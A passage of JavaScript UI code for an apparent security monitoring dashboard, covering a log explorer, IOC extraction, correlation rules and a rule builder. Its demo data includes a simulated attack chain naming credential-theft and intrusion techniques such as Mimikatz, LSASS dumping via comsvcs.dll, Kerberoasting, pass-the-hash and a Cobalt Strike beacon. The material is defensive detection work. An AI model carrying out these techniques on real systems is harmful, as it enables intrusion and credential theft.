              '<span>Healthy: <strong style="color:#00e676">' + INGESTION_PIPELINE.filter(function(p){return p.status==='healthy'}).length + '/' + INGESTION_PIPELINE.length + '</strong></span>' +
            '</div>' +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h">Threat Attribution Analysis</div>' +
        '<div class="ct-panel-b">' +
          '<div style="font-size:.62rem;color:var(--mut);margin-bottom:8px">Based on observed TTPs, the following threat actor profiles are relevant:</div>' +
          THREAT_ACTORS.map(function(ta) {
            var confColor = ta.confidence==='High'?'#ff1744':ta.confidence==='Medium'?'#ff9100':'#ffd600';
            return '<div style="margin-bottom:8px;padding:8px;border:1px solid var(--line);border-radius:4px;background:rgba(0,0,0,.1)">' +
              '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">' +
                '<span style="font-size:.72rem;font-weight:600">' + esc(ta.name) + '</span>' +
                '<div style="display:flex;gap:4px">' +
                  '<span class="ct-tag">' + esc(ta.nation) + '</span>' +
                  '<span class="ct-badge" style="color:' + confColor + ';border-color:' + confColor + '">Conf: ' + esc(ta.confidence) + '</span>' +
                '</div>' +
              '</div>' +
              '<div style="font-size:.6rem;color:var(--acc);margin-bottom:4px">' + esc(ta.relevance) + '</div>' +
              '<div style="display:flex;gap:16px;font-size:.58rem;color:var(--mut)">' +
                '<span>Sectors: ' + ta.sectors.slice(0,3).join(', ') + '</span>' +
                '<span>TTPs: ' + ta.ttps.slice(0,4).join(', ') + '</span>' +
                '<span>Tools: ' + ta.tools.slice(0,3).join(', ') + '</span>' +
              '</div>' +
            '</div>';
          }).join('') +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h">Investigation Checklists</div>' +
        '<div class="ct-panel-b">' +
          '<div class="ct-grid2">' +
            Object.keys(INVESTIGATION_CHECKLISTS).slice(0,4).map(function(key) {
              var items = INVESTIGATION_CHECKLISTS[key];
              var title = key.replace(/-/g,' ').replace(/\b\w/g,function(c2){return c2.toUpperCase();});
              return '<div style="margin-bottom:8px">' +
                '<div style="font-size:.68rem;font-weight:600;margin-bottom:4px;color:var(--acc)">' + esc(title) + ' (' + items.length + ' items)</div>' +
                items.slice(0,5).map(function(item) {
                  return '<div style="display:flex;align-items:center;gap:6px;padding:2px 0;font-size:.6rem">' +
                    '<span style="width:12px;height:12px;border:1px solid var(--line);border-radius:2px;flex-shrink:0"></span>' +
                    '<span style="color:var(--mut)">' + esc(item) + '</span>' +
                  '</div>';
                }).join('') +
                (items.length > 5 ? '<div style="font-size:.55rem;color:var(--mut);margin-top:2px;padding-left:18px">+ ' + (items.length-5) + ' more items</div>' : '') +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +
      '</div>';
  }

  // ========== LOG EXPLORER ==========
  function renderLogExplorer(c) {
    var allLogs = getAllLogs();
    var filtered = allLogs.filter(function(l) {
      if (logFilter.format !== 'all' && l.format !== logFilter.format) return false;
      if (logFilter.severity !== 'all' && l.severity !== logFilter.severity) return false;
      if (logFilter.search && l.raw.toLowerCase().indexOf(logFilter.search.toLowerCase()) === -1) return false;
      return true;
    });

    var formatCounts = {};
    allLogs.forEach(function(l){formatCounts[l.format]=(formatCounts[l.format]||0)+1;});

    c.innerHTML =
      '<div class="ct-panel">' +
        '<div class="ct-panel-h">Log Explorer - ' + allLogs.length + ' events loaded</div>' +
        '<div class="ct-panel-b">' +
          '<div class="ct-filter-row">' +
            '<select class="ct-sel" id="ct-fmt-filter">' +
              '<option value="all">All Formats (' + allLogs.length + ')</option>' +
              '<option value="syslog"' + (logFilter.format==='syslog'?' selected':'') + '>Syslog (' + (formatCounts.syslog||0) + ')</option>' +
              '<option value="json"' + (logFilter.format==='json'?' selected':'') + '>JSON (' + (formatCounts.json||0) + ')</option>' +
              '<option value="cef"' + (logFilter.format==='cef'?' selected':'') + '>CEF (' + (formatCounts.cef||0) + ')</option>' +
              '<option value="windows"' + (logFilter.format==='windows'?' selected':'') + '>Windows Event (' + (formatCounts.windows||0) + ')</option>' +
              '<option value="leef"' + (logFilter.format==='leef'?' selected':'') + '>LEEF (' + (formatCounts.leef||0) + ')</option>' +
              '<option value="access"' + (logFilter.format==='access'?' selected':'') + '>Access Log (' + (formatCounts.access||0) + ')</option>' +
            '</select>' +
            '<select class="ct-sel" id="ct-sev-filter">' +
              '<option value="all">All Severities</option>' +
              '<option value="alert"' + (logFilter.severity==='alert'?' selected':'') + '>Alert</option>' +
              '<option value="error"' + (logFilter.severity==='error'?' selected':'') + '>Error</option>' +
              '<option value="warning"' + (logFilter.severity==='warning'?' selected':'') + '>Warning</option>' +
              '<option value="info"' + (logFilter.severity==='info'?' selected':'') + '>Info</option>' +
            '</select>' +
            '<input type="text" class="ct-inp" id="ct-log-search" placeholder="Search logs..." value="' + esc(logFilter.search) + '" style="max-width:300px">' +
            '<span style="color:var(--mut);font-size:.65rem">' + filtered.length + ' results</span>' +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-top:8px">' +
        '<div class="ct-panel-h">' +
          '<span style="flex:1">Log Entries</span>' +
          '<span class="ct-tag">' + filtered.length + ' events</span>' +
        '</div>' +
        '<div id="ct-log-list" style="max-height:500px;overflow-y:auto;font-family:inherit">' +
          filtered.slice(0,100).map(function(l,i) {
            var sevColor = l.severity==='alert'?'#ff1744':l.severity==='error'?'#ff9100':l.severity==='warning'?'#ffd600':'var(--mut)';
            var fmtColor = l.format==='cef'?'#ff9100':l.format==='json'?'#00e5ff':l.format==='windows'?'#7c4dff':l.format==='leef'?'#ff1744':l.format==='syslog'?'#00e676':'var(--mut)';
            return '<div class="ct-log-line" data-idx="' + i + '">' +
              '<span class="ct-log-ts">' + new Date(l.ts).toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false}) + '</span>' +
              '<span style="color:' + fmtColor + ';min-width:55px;font-size:.55rem;text-transform:uppercase;font-weight:600">' + esc(l.format) + '</span>' +
              '<span style="color:' + sevColor + ';min-width:12px;font-size:1rem" title="' + esc(l.severity) + '">&#9679;</span>' +
              '<span class="ct-log-src">' + esc(l.source) + '</span>' +
              '<span class="ct-log-msg">' + esc(l.raw.substring(0,200)) + (l.raw.length>200?'...':'') + '</span>' +
            '</div>';
          }).join('') +
          (filtered.length > 100 ? '<div style="padding:8px;text-align:center;color:var(--mut);font-size:.65rem">Showing 100 of ' + filtered.length + ' results</div>' : '') +
        '</div>' +
      '</div>' +
      '<div class="ct-panel" style="margin-top:8px">' +
        '<div class="ct-panel-h">Log Format Distribution</div>' +
        '<div class="ct-panel-b">' +
          '<div style="display:flex;gap:4px;height:24px">' +
            Object.keys(formatCounts).map(function(fmt) {
              var pct = Math.round((formatCounts[fmt] / allLogs.length) * 100);
              var colors = {syslog:'#00e676',json:'#00e5ff',cef:'#ff9100',windows:'#7c4dff',leef:'#ff1744',access:'#ffd600'};
              return '<div style="flex:' + pct + ';background:' + (colors[fmt]||'var(--acc)') + ';border-radius:2px;display:flex;align-items:center;justify-content:center;font-size:.5rem;font-weight:600;color:#000;min-width:20px" title="' + fmt.toUpperCase() + ': ' + formatCounts[fmt] + ' (' + pct + '%)">' + (pct > 5 ? fmt.toUpperCase() : '') + '</div>';
            }).join('') +
          '</div>' +
          '<div style="display:flex;gap:12px;margin-top:6px;font-size:.55rem;color:var(--mut);flex-wrap:wrap">' +
            Object.keys(formatCounts).map(function(fmt) {
              var colors = {syslog:'#00e676',json:'#00e5ff',cef:'#ff9100',windows:'#7c4dff',leef:'#ff1744',access:'#ffd600'};
              return '<span><span style="display:inline-block;width:8px;height:8px;background:' + (colors[fmt]||'var(--acc)') + ';border-radius:1px;vertical-align:middle;margin-right:3px"></span>' + fmt.toUpperCase() + ' (' + formatCounts[fmt] + ')</span>';
            }).join('') +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-grid3" style="margin-top:8px">' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Severity Breakdown</div>' +
          '<div class="ct-panel-b">' +
            (function() {
              var sevCounts = {};
              allLogs.forEach(function(l){sevCounts[l.severity]=(sevCounts[l.severity]||0)+1;});
              var sevOrder = ['alert','error','warning','info'];
              var sevColors = {alert:'#ff1744',error:'#ff9100',warning:'#ffd600',info:'var(--mut)'};
              return sevOrder.filter(function(s){return sevCounts[s]}).map(function(sev) {
                var cnt = sevCounts[sev] || 0;
                var pct = Math.round((cnt / allLogs.length) * 100);
                return '<div style="display:flex;align-items:center;gap:6px;margin-bottom:4px;font-size:.62rem">' +
                  '<span style="color:' + sevColors[sev] + ';min-width:50px;font-weight:600;text-transform:uppercase">' + sev + '</span>' +
                  '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + pct + '%;background:' + sevColors[sev] + '"></div></div>' +
                  '<span style="min-width:30px;text-align:right;font-weight:600">' + cnt + '</span>' +
                '</div>';
              }).join('');
            })() +
          '</div>' +
        '</div>' +

        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Top Source Hosts</div>' +
          '<div class="ct-panel-b">' +
            (function() {
              var srcCounts = {};
              allLogs.forEach(function(l){srcCounts[l.source]=(srcCounts[l.source]||0)+1;});
              var sorted = Object.keys(srcCounts).sort(function(a,b){return srcCounts[b]-srcCounts[a];}).slice(0,6);
              var maxSrc = srcCounts[sorted[0]] || 1;
              return sorted.map(function(src) {
                var cnt = srcCounts[src];
                var pct = Math.round((cnt / maxSrc) * 100);
                return '<div style="display:flex;align-items:center;gap:6px;margin-bottom:3px;font-size:.6rem">' +
                  '<span style="color:var(--acc);min-width:90px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' + esc(src) + '</span>' +
                  '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + pct + '%;background:var(--acc)"></div></div>' +
                  '<span style="min-width:20px;text-align:right">' + cnt + '</span>' +
                '</div>';
              }).join('');
            })() +
          '</div>' +
        '</div>' +

        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Quick Stats</div>' +
          '<div class="ct-panel-b">' +
            (function() {
              var alertCount = allLogs.filter(function(l){return l.severity==='alert'}).length;
              var errorCount = allLogs.filter(function(l){return l.severity==='error'}).length;
              var uniqueSources = {};
              allLogs.forEach(function(l){uniqueSources[l.source]=true;});
              var firstTs = allLogs.length > 0 ? new Date(allLogs[0].ts).toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',hour12:false}) : '--';
              var lastTs = allLogs.length > 0 ? new Date(allLogs[allLogs.length-1].ts).toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',hour12:false}) : '--';
              return '<div style="font-size:.62rem">' +
                '<div style="display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid var(--line)"><span style="color:var(--mut)">Total Events</span><span style="font-weight:600">' + allLogs.length + '</span></div>' +
                '<div style="display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid var(--line)"><span style="color:var(--mut)">Alert Events</span><span style="font-weight:600;color:#ff1744">' + alertCount + '</span></div>' +
                '<div style="display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid var(--line)"><span style="color:var(--mut)">Error Events</span><span style="font-weight:600;color:#ff9100">' + errorCount + '</span></div>' +
                '<div style="display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid var(--line)"><span style="color:var(--mut)">Unique Sources</span><span style="font-weight:600">' + Object.keys(uniqueSources).length + '</span></div>' +
                '<div style="display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid var(--line)"><span style="color:var(--mut)">Log Formats</span><span style="font-weight:600">' + Object.keys(formatCounts).length + '</span></div>' +
                '<div style="display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid var(--line)"><span style="color:var(--mut)">Time Range</span><span style="font-weight:600">' + firstTs + ' - ' + lastTs + '</span></div>' +
                '<div style="display:flex;justify-content:space-between;padding:3px 0"><span style="color:var(--mut)">Filtered</span><span style="font-weight:600;color:var(--acc)">' + filtered.length + ' / ' + allLogs.length + '</span></div>' +
              '</div>';
            })() +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div id="ct-log-detail"></div>';

    c.querySelector('#ct-fmt-filter').onchange = function(e) {
      logFilter.format = e.target.value; renderLogExplorer(c);
    };
    c.querySelector('#ct-sev-filter').onchange = function(e) {
      logFilter.severity = e.target.value; renderLogExplorer(c);
    };
    var searchInput = c.querySelector('#ct-log-search');
    var searchTimeout;
    searchInput.oninput = function(e) {
      clearTimeout(searchTimeout);
      searchTimeout = setTimeout(function() {
        logFilter.search = e.target.value; renderLogExplorer(c);
      }, 300);
    };

    c.querySelector('#ct-log-list').onclick = function(e) {
      var line = e.target.closest('.ct-log-line');
      if (!line) return;
      var idx = parseInt(line.dataset.idx,10);
      var log = filtered[idx];
      if (!log) return;
      var detailEl = c.querySelector('#ct-log-detail');
      var prev = c.querySelector('.ct-log-line.selected');
      if (prev) prev.classList.remove('selected');
      line.classList.add('selected');

      var detail = '';
      if (log.format === 'json') {
        detail = JSON.stringify(log.data.data || log.data, null, 2);
      } else if (log.format === 'windows') {
        detail = 'Event ID: ' + log.data.data.eventId + '\nChannel: ' + (log.data.data.channel||log.data.channel) + '\nComputer: ' + (log.data.data.computer||log.data.computer) + '\nMessage: ' + (log.data.data.msg||log.data.msg) + '\n\nEvent Data:\n' + JSON.stringify(log.data.data.data || log.data.data, null, 2);
      } else {
        detail = log.raw;
      }

      var ips = detail.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || [];
      var domains = detail.match(/\b[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z]{2,})+\b/g) || [];
      var hashes = detail.match(/\b[a-f0-9]{32,64}\b/g) || [];
      var uniqueIps = ips.filter(function(v,i,a){return a.indexOf(v)===i;});
      var uniqueDomains = domains.filter(function(v,i,a){return a.indexOf(v)===i;});

      detailEl.innerHTML =
        '<div class="ct-panel" style="margin-top:8px">' +
          '<div class="ct-panel-h">Event Detail</div>' +
          '<div class="ct-panel-b">' +
            '<div style="display:flex;gap:12px;margin-bottom:8px;font-size:.65rem">' +
              '<span>Timestamp: <strong>' + esc(log.ts) + '</strong></span>' +
              '<span>Format: <strong>' + esc(log.format.toUpperCase()) + '</strong></span>' +
              '<span>Severity: <strong>' + esc(log.severity) + '</strong></span>' +
              '<span>Source: <strong>' + esc(log.source) + '</strong></span>' +
            '</div>' +
            '<div class="ct-log-detail">' + esc(detail) + '</div>' +
            (uniqueIps.length > 0 || uniqueDomains.length > 0 || hashes.length > 0 ?
              '<div style="margin-top:8px">' +
                '<div style="font-size:.62rem;color:var(--mut);text-transform:uppercase;margin-bottom:4px">Extracted IOCs</div>' +
                '<div style="display:flex;gap:4px;flex-wrap:wrap">' +
                  uniqueIps.map(function(ip){return '<span class="ct-tag" style="background:rgba(0,230,118,.1);color:#00e676;border-color:rgba(0,230,118,.2)">IP: '+esc(ip)+'</span>';}).join('') +
                  uniqueDomains.map(function(d){return '<span class="ct-tag" style="background:rgba(255,145,0,.1);color:#ff9100;border-color:rgba(255,145,0,.2)">Domain: '+esc(d)+'</span>';}).join('') +
                  hashes.map(function(h){return '<span class="ct-tag" style="background:rgba(124,77,255,.1);color:#7c4dff;border-color:rgba(124,77,255,.2)">Hash: '+esc(h.substring(0,16))+'...</span>';}).join('') +
                '</div>' +
              '</div>'
            : '') +
            '<div style="display:flex;gap:6px;margin-top:10px">' +
              '<button class="ct-btn ct-btn-sm">Create Alert</button>' +
              '<button class="ct-btn ct-btn-sm ct-btn-ghost">Add to Hunt</button>' +
              '<button class="ct-btn ct-btn-sm ct-btn-ghost">Export Event</button>' +
              '<button class="ct-btn ct-btn-sm ct-btn-ghost">Find Related</button>' +
            '</div>' +
          '</div>' +
        '</div>';
    };

    var logListEl = c.querySelector('#ct-log-list');
    if (logListEl) {
      logListEl.ondblclick = function(e) {
        var line = e.target.closest('.ct-log-line');
        if (!line) return;
        var idx = parseInt(line.dataset.idx,10);
        var log = filtered[idx];
        if (!log) return;

        var detailEl = c.querySelector('#ct-log-detail');
        var fields = [];
        if (log.format === 'windows' && log.data && log.data.data) {
          var wd = log.data.data;
          fields.push({key:'EventID',val:String(wd.eventId||wd.EventID||'')});
          fields.push({key:'Channel',val:String(wd.channel||'')});
          fields.push({key:'Computer',val:String(wd.computer||'')});
          if (wd.data) {
            Object.keys(wd.data).forEach(function(k) {
              fields.push({key:k,val:String(wd.data[k])});
            });
          }
        } else if (log.format === 'json' && log.data && log.data.data) {
          var jd = log.data.data;
          Object.keys(jd).forEach(function(k) {
            var v = jd[k];
            fields.push({key:k,val:typeof v === 'object' ? JSON.stringify(v) : String(v)});
          });
        } else if (log.format === 'cef' && log.data && log.data.raw) {
          var cefParts = log.data.raw.split('|');
          if (cefParts.length >= 7) {
            fields.push({key:'Vendor',val:cefParts[1]});
            fields.push({key:'Product',val:cefParts[2]});
            fields.push({key:'Version',val:cefParts[3]});
            fields.push({key:'EventID',val:cefParts[4]});
            fields.push({key:'Name',val:cefParts[5]});
            fields.push({key:'Severity',val:cefParts[6]});
            if (cefParts[7]) {
              cefParts[7].split(' ').forEach(function(pair) {
                var eq = pair.indexOf('=');
                if (eq > 0) fields.push({key:pair.substring(0,eq),val:pair.substring(eq+1)});
              });
            }
          }
        }

        if (fields.length > 0) {
          detailEl.innerHTML += '<div class="ct-panel" style="margin-top:8px">' +
            '<div class="ct-panel-h">Extracted Fields (' + fields.length + ')</div>' +
            '<div class="ct-panel-b">' +
              fields.map(function(f) {
                return '<div class="ct-field-row">' +
                  '<span class="ct-field-key">' + esc(f.key) + '</span>' +
                  '<span class="ct-field-val">' + esc(f.val) + '</span>' +
                '</div>';
              }).join('') +
            '</div>' +
          '</div>';
        }
      };
    }
  }

  // ========== CORRELATION ENGINE ==========
  function renderCorrelation(c) {
    c.innerHTML =
      '<div class="ct-grid2" style="margin-bottom:12px">' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Correlation Rules (' + CORRELATION_RULES.length + ')</div>' +
          '<div class="ct-panel-b" style="max-height:500px;overflow-y:auto">' +
            CORRELATION_RULES.map(function(r) {
              var sevClass = r.severity==='Critical'?'ct-crit':'ct-high';
              return '<div class="ct-rule-card' + (correlationTest===r.id?' selected':'') + '" data-cid="' + esc(r.id) + '" style="margin-bottom:8px">' +
                '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">' +
                  '<span style="font-size:.72rem;font-weight:600">' + esc(r.name) + '</span>' +
                  '<span class="ct-badge ' + sevClass + '">' + esc(r.severity) + '</span>' +
                '</div>' +
                '<div style="font-size:.62rem;color:var(--mut);margin-bottom:8px">' + esc(r.description) + '</div>' +
                '<div class="ct-corr-flow">' +
                  r.events.map(function(ev,i) {
                    return (i > 0 ? '<span class="ct-corr-arrow">&rarr;</span>' : '') +
                      '<span class="ct-corr-event">' + esc(ev) + '</span>';
                  }).join('') +
                  '<span class="ct-corr-window">' + esc(r.window) + '</span>' +
                '</div>' +
                '<div style="display:flex;gap:8px;font-size:.6rem;color:var(--mut);margin-top:4px">' +
                  '<span>MITRE: <span style="color:var(--acc)">' + esc(r.mitre) + '</span></span>' +
                  '<span>Action: ' + esc(r.action) + '</span>' +
                '</div>' +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +

        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Rule Builder</div>' +
          '<div class="ct-panel-b">' +
            '<div style="margin-bottom:10px">' +
              '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Rule Name</label>' +
              '<input type="text" class="ct-inp" placeholder="My Correlation Rule">' +
            '</div>' +
            '<div style="margin-bottom:10px">' +
              '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Description</label>' +
              '<input type="text" class="ct-inp" placeholder="Describe what this rule detects...">' +
            '</div>' +
            '<div class="ct-grid2" style="margin-bottom:10px">' +
              '<div>' +
                '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Event A (Trigger)</label>' +
                '<select class="ct-sel" style="width:100%">' +
                  '<option>EventID 4625 - Failed Login</option>' +
                  '<option>EventID 4624 - Successful Login</option>' +
                  '<option>EventID 4688 - Process Created</option>' +
                  '<option>EventID 4720 - Account Created</option>' +
                  '<option>EventID 7045 - Service Installed</option>' +
                  '<option>IDS Alert</option>' +
                  '<option>Firewall Block</option>' +
                  '<option>DNS Query</option>' +
                '</select>' +
              '</div>' +
              '<div>' +
                '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Event B (Follow-up)</label>' +
                '<select class="ct-sel" style="width:100%">' +
                  '<option>EventID 4624 - Successful Login</option>' +
                  '<option>EventID 4672 - Priv Assigned</option>' +
                  '<option>EventID 4688 - Process Created</option>' +
                  '<option>EventID 4698 - Sched Task</option>' +
                  '<option>EventID 1102 - Log Cleared</option>' +
                  '<option>Network Connection (Outbound)</option>' +
                  '<option>File Access</option>' +
                  '<option>Data Transfer >10MB</option>' +
                '</select>' +
              '</div>' +
            '</div>' +
            '<div class="ct-grid3" style="margin-bottom:10px">' +
              '<div>' +
                '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Time Window</label>' +
                '<select class="ct-sel" style="width:100%">' +
                  '<option>1 minute</option>' +
                  '<option>5 minutes</option>' +
                  '<option selected>10 minutes</option>' +
                  '<option>15 minutes</option>' +
                  '<option>30 minutes</option>' +
                  '<option>1 hour</option>' +
                '</select>' +
              '</div>' +
              '<div>' +
                '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Threshold (Event A)</label>' +
                '<input type="number" class="ct-inp" value="5" min="1" max="1000">' +
              '</div>' +
              '<div>' +
                '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Severity</label>' +
                '<select class="ct-sel" style="width:100%">' +
                  '<option>Critical</option>' +
                  '<option selected>High</option>' +
                  '<option>Medium</option>' +
                  '<option>Low</option>' +
                '</select>' +
              '</div>' +
            '</div>' +
            '<div style="margin-bottom:10px">' +
              '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Correlation Field (must match between events)</label>' +
              '<select class="ct-sel" style="width:100%">' +
                '<option>Source IP</option>' +
                '<option>Destination IP</option>' +
                '<option>Username</option>' +
                '<option>Hostname</option>' +
                '<option>Process Name</option>' +
              '</select>' +
            '</div>' +
            '<div style="display:flex;gap:8px">' +
              '<button class="ct-btn">Save Rule</button>' +
              '<button class="ct-btn ct-btn-ghost">Test Rule</button>' +
            '</div>' +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel">' +
        '<div class="ct-panel-h">Recent Correlation Matches</div>' +
        '<div class="ct-panel-b">' +
          '<table class="ct-tbl">' +
            '<thead><tr><th>Time</th><th>Rule</th><th>Severity</th><th>Source</th><th>Events Matched</th><th>Action Taken</th></tr></thead>' +
            '<tbody>' +
              '<tr><td>08:30:30</td><td>Brute Force + Login</td><td><span class="ct-badge ct-crit">Critical</span></td><td>10.0.2.100</td><td>4625 x3 &rarr; 4624</td><td>Alert Generated</td></tr>' +
              '<tr><td>08:32:00</td><td>Privilege Escalation Chain</td><td><span class="ct-badge ct-crit">Critical</span></td><td>10.0.2.100</td><td>4624 &rarr; 4672 &rarr; 4688</td><td>Alert + Isolate</td></tr>' +
              '<tr><td>08:35:00</td><td>Persistence Installation</td><td><span class="ct-badge ct-high">High</span></td><td>DC-01</td><td>4688 (cmd) &rarr; 7045</td><td>Alert Generated</td></tr>' +
              '<tr><td>08:37:00</td><td>Data Staging and Exfil</td><td><span class="ct-badge ct-crit">Critical</span></td><td>10.0.2.100</td><td>4663 x45 &rarr; POST 450MB</td><td>Alert + Block</td></tr>' +
              '<tr><td>08:34:30</td><td>Defense Evasion</td><td><span class="ct-badge ct-crit">Critical</span></td><td>DC-01</td><td>4689 (AV) &rarr; 1102</td><td>Alert + Restore</td></tr>' +
              '<tr><td>08:42:00</td><td>Lateral Movement</td><td><span class="ct-badge ct-high">High</span></td><td>10.0.2.100</td><td>4624 (A) &rarr; 5156 (445) &rarr; 4624 (B)</td><td>Alert Generated</td></tr>' +
            '</tbody>' +
          '</table>' +
        '</div>' +
      '</div>' +

      '<div class="ct-grid2" style="margin-top:12px">' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Attack Chain Reconstruction</div>' +
          '<div class="ct-panel-b">' +
            '<div style="font-size:.62rem;color:var(--mut);margin-bottom:8px">Correlated kill chain from observed events on 10.0.2.100</div>' +
            [
              {step:'1. Initial Access',detail:'SSH brute force from 185.220.101.34 (Tor exit), successful auth as svc-admin',time:'08:01-08:04',sev:'high'},
              {step:'2. Execution',detail:'PowerShell with encoded command, downloads shell.ps1 from 10.0.2.100:8080',time:'08:32:00',sev:'crit'},
              {step:'3. Persistence',detail:'Registry Run key + Scheduled task + Service install pointing to Temp directory',time:'08:35:00',sev:'high'},
              {step:'4. Privilege Escalation',detail:'SeDebugPrivilege assigned, pass-the-hash to domain admin',time:'08:31:00',sev:'crit'},
              {step:'5. Defense Evasion',detail:'Security audit log cleared on DC-01, AV process terminated',time:'08:34:30',sev:'crit'},
              {step:'6. Credential Access',detail:'Mimikatz dropped, LSASS dump via comsvcs.dll, Kerberoasting (RC4 TGS)',time:'08:34-08:38',sev:'crit'},
              {step:'7. Discovery',detail:'net group, nltest, dsquery for AD enumeration, LDAP objectClass=* search',time:'08:39-08:40',sev:'high'},
              {step:'8. Lateral Movement',detail:'SMB admin share access to FS-01, 10.0.2.200 via pass-the-hash',time:'08:42:00',sev:'high'},
              {step:'9. Collection',detail:'Mass file access on Finance$, HR$, IT$ shares (45+ files in 1min)',time:'08:36-08:37',sev:'high'},
              {step:'10. Exfiltration',detail:'450MB HTTPS transfer to 198.51.100.50 detected and blocked',time:'08:41:00',sev:'crit'},
              {step:'11. Command & Control',detail:'Cobalt Strike beacon to 45.33.32.156:443, 60s interval with jitter',time:'08:07-ongoing',sev:'crit'},
            ].map(function(s) {
              var sevBorder = s.sev==='crit'?'#ff1744':'#ff9100';
              return '<div style="display:flex;align-items:flex-start;gap:8px;padding:6px 0;border-left:3px solid ' + sevBorder + ';padding-left:10px;margin-left:8px;margin-bottom:4px">' +
                '<div style="min-width:140px">' +
                  '<div style="font-size:.68rem;font-weight:600;color:' + sevBorder + '">' + esc(s.step) + '</div>' +
                  '<div style="font-size:.55rem;color:var(--mut)">' + esc(s.time) + '</div>' +
                '</div>' +
                '<div style="font-size:.65rem;color:var(--txt)">' + esc(s.detail) + '</div>' +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +

        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Correlation Statistics</div>' +
          '<div class="ct-panel-b">' +
            '<div class="ct-grid2" style="margin-bottom:12px">' +
              '<div class="ct-stat"><div class="ct-stat-v" style="color:var(--acc)">6</div><div class="ct-stat-l">Rules Triggered (24h)</div></div>' +
              '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff1744">4</div><div class="ct-stat-l">Critical Chains</div></div>' +
              '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e676">89<span style="font-size:.6rem">%</span></div><div class="ct-stat-l">True Positive Rate</div></div>' +
              '<div class="ct-stat"><div class="ct-stat-v">3.2<span style="font-size:.6rem">min</span></div><div class="ct-stat-l">Avg Detection Time</div></div>' +
            '</div>' +
            '<div style="margin-bottom:8px">' +
              '<div style="font-size:.62rem;color:var(--mut);text-transform:uppercase;margin-bottom:6px">Rule Effectiveness (Last 30 Days)</div>' +
              [
                {name:'Brute Force + Login',hits:23,fp:2},
                {name:'Priv Escalation Chain',hits:8,fp:1},
                {name:'Lateral Movement',hits:15,fp:3},
                {name:'Data Staging + Exfil',hits:5,fp:0},
                {name:'Account Takeover',hits:12,fp:4},
                {name:'Persistence Install',hits:18,fp:2},
                {name:'Defense Evasion',hits:3,fp:0},
                {name:'Cloud Credential',hits:7,fp:1},
              ].map(function(r) {
                var maxHits = 23;
                var w = Math.round((r.hits / maxHits) * 100);
                return '<div style="display:flex;align-items:center;gap:6px;margin-bottom:4px;font-size:.62rem">' +
                  '<span style="min-width:130px;color:var(--mut)">' + esc(r.name) + '</span>' +
                  '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + w + '%;background:var(--acc)"></div></div>' +
                  '<span style="min-width:30px;text-align:right;font-weight:600">' + r.hits + '</span>' +
                  '<span style="min-width:20px;text-align:right;color:' + (r.fp>0?'#ff9100':'#00e676') + '">' + r.fp + ' FP</span>' +
                '</div>';
              }).join('') +
            '</div>' +
          '</div>' +
        '</div>' +
      '</div>';

    c.querySelectorAll('.ct-rule-card').forEach(function(card) {
      card.onclick = function() {
        correlationTest = card.dataset.cid === correlationTest ? null : card.dataset.cid;
        renderCorrelation(c);
      };
    });
  }

  // ========== DETECTION RULES ==========
  function renderDetection(c) {
    var showSigma = selectedSigma !== null;
    var sigma = showSigma ? SIGMA_RULES[selectedSigma] : null;
    var enabledCount = DETECTION_RULES.filter(function(r){return r.enabled}).length;

    c.innerHTML =
      '<div class="ct-grid2" style="margin-bottom:12px">' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:var(--acc)">' + DETECTION_RULES.length + '</div><div class="ct-stat-l">Detection Rules</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e676">' + enabledCount + '</div><div class="ct-stat-l">Enabled</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:var(--acc)">' + SIGMA_RULES.length + '</div><div class="ct-stat-l">Sigma Rules</div></div>' +
